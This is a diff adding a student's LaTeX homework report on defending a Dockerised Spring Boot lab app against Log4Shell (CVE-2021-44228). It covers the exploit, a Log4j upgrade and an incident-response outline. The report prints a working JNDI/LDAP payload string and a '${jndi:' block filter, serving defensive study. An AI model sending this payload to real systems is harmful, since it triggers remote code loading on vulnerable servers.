@@ -1,0 +1,35 @@
+\documentclass[a4paper,12pt]{article}
+\usepackage[utf8]{inputenc}
+\usepackage{geometry}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{titling}
+\usepackage{parskip}
+\geometry{margin=1in}
+\usepackage{noto}
+\title{Homework-9: Securing Systems Against Log4Shell}
+\author{Nilansh Upadhyay}
+\date{May 2025}
+\begin{document}
+\maketitle
+\section{Architecture Diagram}
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.8\textwidth]{architecture_diagram.png}
+    \caption{System Architecture: Java App, LDAP Server, and Attacker}
+\end{figure}
+The diagram shows a Spring Boot app in a Docker container (port 8080) logging input via Log4j. An attacker sends a malicious POST to /log, triggering a JNDI lookup to an LDAP server (port 1389).
+\section{Exploit Explanation}
+Log4Shell (CVE-2021-44228) in Log4j 2.14.1 enables remote code execution via JNDI lookups. The payload \texttt{\$\{jndi:ldap://host.docker.internal:1389/a\}} triggers a lookup to an attacker’s LDAP server, mapping to MITRE ATT\&CK T1190.
+\section{Mitigation and Response Summary}
+\subsection{Mitigation}
+Updated Log4j to 2.17.0, disabling JNDI lookups. Added input validation in \texttt{LogController.java} to block \texttt{\$\{jndi:\}}. Redeployed and tested, aligning with MITRE DEFEND.
+\subsection{Incident Response}
+Using MITRE REACT:
+\begin{itemize}
+    \item \textbf{Detect}: Found \texttt{\$\{jndi:\}} in logs.
+    \item \textbf{Contain}: Stopped container.
+    \item \textbf{Eradicate}: Verified no processes.
+    \item \textbf{Recover}: Deployed patched app.
+\end{itemize}
+\end{document}
